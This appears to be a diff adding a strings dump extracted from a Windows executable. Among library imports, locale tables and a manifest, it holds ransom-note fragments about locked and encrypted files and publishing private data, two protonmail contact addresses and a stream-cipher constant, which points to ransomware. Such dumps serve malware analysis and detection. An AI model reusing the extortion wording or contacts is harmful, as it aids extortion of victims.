@@ -1,0 +1,501 @@
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+.gfids
+@.rsrc
+@.reloc
+Pj@j@V
+_<#u$A
+3X,3x03p43P83H<
+{XWj V
+URPQQh
+;t$,v-
+UQPXY]Y[
+YYhlaB
+t#Vh<mB
+WWWPWS
+u-PWWS
+SSVWh 
+f9:t!V
+TVh8tB
+QQSWj0j@
+PPPPPPPP
+PPPPPWS
+PP9E u:PPVWP
+QQSVWd
+Unknown exception
+bad allocation
+bad array new length
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__ptr64
+__restrict
+__unaligned
+restrict(
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+CorExitProcess
+GetCurrentPackageId
+LCMapStringEx
+LocaleNameToLCID
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+?5Wg4p
+%S#[k=
+"B <1=
+_hypot
+_nextafter
+expand 32-byte kexpand 16-byte kstring too long
+invalid string position
+bad exception
+.text$mn
+.text$x
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$r
+.rdata$sxdata
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.xdata$x
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.data$r
+.gfids$x
+.gfids$y
+.rsrc$01
+.rsrc$02
+wsprintfW
+USER32.dll
+WS2_32.dll
+LoadLibraryA
+GetProcAddress
+CloseHandle
+GetLocalTime
+lstrlenW
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+GetCurrentProcess
+TerminateProcess
+IsProcessorFeaturePresent
+QueryPerformanceCounter
+GetCurrentProcessId
+GetCurrentThreadId
+GetSystemTimeAsFileTime
+InitializeSListHead
+IsDebuggerPresent
+GetStartupInfoW
+GetModuleHandleW
+KERNEL32.dll
+RaiseException
+RtlUnwind
+GetLastError
+SetLastError
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+InitializeCriticalSectionAndSpinCount
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+FreeLibrary
+LoadLibraryExW
+GetStdHandle
+WriteFile
+GetModuleFileNameA
+MultiByteToWideChar
+WideCharToMultiByte
+ExitProcess
+GetModuleHandleExW
+GetACP
+HeapFree
+HeapAlloc
+FindClose
+FindFirstFileExA
+FindNextFileA
+IsValidCodePage
+GetOEMCP
+GetCPInfo
+GetCommandLineA
+GetCommandLineW
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+LCMapStringW
+SetStdHandle
+GetFileType
+GetStringTypeW
+GetProcessHeap
+HeapSize
+HeapReAlloc
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+SetFilePointerEx
+WriteConsoleW
+EncodePointer
+DecodePointer
+CreateFileW
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+rk is lock
+t try t
+r softw
+crypti
+ol write h
+bootsdurslecne1976@protonmail.com
+rinmayturly1972@protonmail.com
+If you do n
+ will publish priv
+ws sit
+C{Mp)R
+.?AVbad_alloc@std@@
+.?AVexception@std@@
+.?AVlogic_error@std@@
+.?AVlength_error@std@@
+.?AVout_of_range@std@@
+.?AVtype_info@@
+.?AVbad_array_new_length@std@@
+.?AVbad_exception@std@@
+<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level='asInvoker' uiAccess='false' />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+; <%<c<h<
+6<7@7D7H7L7P7T7X7\7`7d7h7w7
+0!0?0Q0p0
+2G2h2x2
+3+3J3k3
+464U4g4p4
+0J1U133P3o3
+344O4Z4w4
+5&5K5u5
+5!6B6]6h6
+7(7C7^7j7
+7'818e8
+9 :I:l:
+<!=<=t=
+474j7t7
+8/8U8p8
+>!>J>U>|>
+?+?6?E?
+111H1f1q1
+6<6W6j6
+?4?E?m?
+=0W0h0
+0l469A9E9K9R9\9l9
+9*:I:c:w:
+:";5;P;d;t;
+2J2T2s2
+434S4n4
+?#?2?P?
+1-181?1]1
+5 5+5<5D5K5Q5o5z5
+6$6G6h6
+7<7S7[7y7
+808g8t8
+8'919S9
+:::E:O:z:
+:#;A;W;l;
+<3<C<e<
+=A=K=f=
+>">/>M>\>{>
+?J?T?g?
+$1A1V1V3\3b3f3l3r3v3|3
+9)989S9^9}9
+5/5O5n5
+6*6E6j6t6
+4M7l7w7
+9.9S9n9v9~9
+9*::;c;
+121A3M3Y3a3|3
+3E4f4q6
+< <2=S=,?M?
+2!2@2^2m2
+3(3@3^3l3
+4&4?4]4y4
+4@5P5U5z5
+5&626A6\6i6
+7,787H7
+9!:@:]:x:
+;1;G;N;d;m;x;
+< <&<0<:<J<Z<j<s<
+=#=-=7=J=O=
+0#070I0\0
+051H1[1g1w1
+1J2W2~2
+3%3T3\3t3z3
+545u5{5
+5!616N6
+6V7_7g7
+8$838>8
+;[;`;d;h;l;V>
+050%181
+414E4a4k4u4
+515=5y5
+696I6N6S6z6
+7(74797>7n7v7{7
+9S9A:K:X:
+:d;k;z;
+;#<W=m=
+>(>f>p>v>|>
+)1\1a1
+3!3=3F3
+4,4?4[4
+6%6e6w6}6
+<I<X<]<n<t<
+>!>3>q>w>
+?O?X?`?
+2,333h3y3
+4#404:4\4m4z4
+8"9I9R:
+;9;C;T;Y;n;
+? ?+???J?a?
+)0_0r0
+2'3J3p3
+4 4G4`4o4{4
+5#5(5C5M5i5t5y5~5
+6#6(6-6N6^6z6
+757X7c7p7
+8,9;9I9f9n9
+="=4=F=X=j=|=
+2.3g3}3
+576>6E6L6Y6
+8%8=8O8|8
+=D>N>q>{>
+?%?:?Q?t?
+:?:S:.;M;R;
+989C9P9b9
+9G:\:e:n:
+=!=)=G=O=
+2)3F3V3
+4\5g5r5x5
+66+6>6]6
+93:9:>:D:U:
+D2G3X366;6M6k6
+==$=(=,=0=
+B0v1a3
+3S4V5g5
+7 888>8F8
+(101<1@1D1H1L1X1\1`1p1t1x1
+4(5,5054585<5@5D5H5L5P5T5X5\5`5d5h5l5p5t5x5|5
+6 6$6(6,6064686<6@6D6H6L6P6T6X6\6`6d6h6l6p6t6x6|6
+6P=X=`=d=h=l=p=t=x=|=
+=0?4?8?<?p?t?x?|?
+> >$>(>,>0>4>8><>@>D>H>L>P>T>X>\>`>d>h>l>p>t>x>|>
+? ?$?(?,?0?4?8?<?@?D?H?\?d?l?t?|?
+0$0,040<0D0L0T0\0d0l0t0|0
+1$1,141<1D1L1T1\1d1l1t1|1
+2$2,242<2D2L2T2\2d2l2t2|2
+3$3,343<3D3L3T3\3d3l3t3|3
+4$4,444<4D4L4T4\4d4l4t4|4
+5$5,545<5D5L5T5\5d5l5t5|5
+6$6,646<6D6L6T6\6d6l6t6
+1 1(10181@1H1P1X1`1h1p1x1
+2 2(20282@2H2P2X2`2h2p2x2
+3 3(30383@3H3P3X3`3h3p3x3
+4 4(40484@4H4P4X4`4h4p4x4
+5 5(50585@5H5P5X5`5h5p5x5
+6 6(60686@6H6P6X6`6h6p6x6
+7 7(70787@7H7P7X7`7h7p7x7
+1,;4;<;D;L;T;\;d;l;t;|;
+<4=8=@=`=d=t=x=
+>0>@>D>T>X>\>`>h>
+?(?,?<?@?D?H?P?h?x?|?
+2,3@3P3`3h3p3x3|3
+4$4(4,444H4d4h4p4x4
+5(5H5h5
+6(6H6h6
+7,707P7p7
+888@8D8\8`8|8
+60646H6L6P6T6X6\6`6d6h6l6x6|6
+080P0x0
+Badvapi32
+api-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+mscoree.dll
+Bja-JP
+Bapi-ms-win-appmodel-runtime-l1-1-1
+api-ms-win-core-datetime-l1-1-1
+api-ms-win-core-file-l2-1-1
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-kernel32-package-current-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+user32
+         (((((                  H
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+zh-CHS
+az-AZ-Latn
+uz-UZ-Latn
+kok-IN
+syr-SY
+div-MV
+quz-BO
+sr-SP-Latn
+az-AZ-Cyrl
+uz-UZ-Cyrl
+quz-EC
+sr-SP-Cyrl
+quz-PE
+smj-NO
+bs-BA-Latn
+smj-SE
+sr-BA-Latn
+sma-NO
+sr-BA-Cyrl
+sma-SE
+sms-FI
+smn-FI
+zh-CHT
+az-az-cyrl
+az-az-latn
+bs-ba-latn
+div-mv
+kok-in
+quz-bo
+quz-ec
+quz-pe
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+syr-sy
+uz-uz-cyrl
+uz-uz-latn
+zh-chs
+zh-cht
+CONOUT$
+stopmarker
+.QMIBK
